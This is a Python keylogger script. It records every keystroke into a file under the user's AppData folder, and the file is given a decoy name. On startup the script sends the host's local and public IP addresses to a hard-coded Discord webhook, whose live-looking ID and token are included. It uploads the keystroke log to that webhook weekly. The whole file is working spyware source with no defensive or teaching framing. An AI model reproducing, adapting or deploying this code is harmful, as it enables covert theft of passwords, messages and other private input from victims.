import os
import time
import socket
import discord
import keyboard
import requests as req
from datetime import datetime

appdata = os.getenv("APPDATA")
save_path = f"{appdata}\\discord\\"
save_file = "PictureEncodingStats.txt"
send_every = "thursday"

# WEBHOOK DETAILS
# https://discord.com/api/webhooks/{id}/{token}/
ID = 949011513451118643
TOKEN = "F7rzmPDTucM0KsFqpXV5HC0ohXD-yk_5j5KPJF8tQYTV_OwF82WeLKwC5WZEw_shf4Xz"

hostname = socket.gethostname()

if not os.path.exists(f"{appdata}\\discord"): os.mkdir(f"{appdata}\\discord")

def send_webhook(webhook_id, webhook_token, content, file_path=None, username = "", avatar_url = ""):
    if file_path != None:
        with open(file_path, "rb") as f:
            file = discord.File(f)

    webhook = discord.Webhook.partial(webhook_id, webhook_token, adapter=discord.RequestsWebhookAdapter())
    webhook.send(content, username=username, file=file_path, avatar_url=avatar_url)

def get_ip(local: bool):
    if local:
        return socket.gethostbyname(hostname)
    else:
        r = req.get("https://api.ipify.org/")
        return r.text

def save_log(save_path, save_file, key):
    formatted_time = datetime.now().strftime("%I:%M:%S %p ─ %d/%m/%Y")
    with open(save_path+save_file, "a") as f:
        f.write(f"\n{formatted_time} | {key}")

def refresh_log(save_path, save_file):
    with open(save_path+save_file, "w") as f: pass

def startup():
    local_ip = get_ip(True)
    public_ip = get_ip(False)
    content = f"```\nLocal IP  | {local_ip}\nPublic IP | {public_ip}```"
    send_webhook(ID, TOKEN, content, username=f"request from {hostname}")

def main():
    refreshed = False
    last_key = ""
    end = 0
    while True:
        start = time.time()
        day = datetime.now().strftime("%A")
        if day.lower() == send_every.lower() and refreshed == False:
            send_webhook(ID, TOKEN, "KEYLOGS FROM THE LAST WEEK", save_path+save_file, hostname)
        pressed = keyboard.read_key()
        if pressed == last_key and start - time.time() < 1.0:
            save_log(save_path, save_file, pressed)
            continue
        save_log(save_path, save_file, pressed)
        last_key = pressed

if __name__ == "__main__": startup(); main()
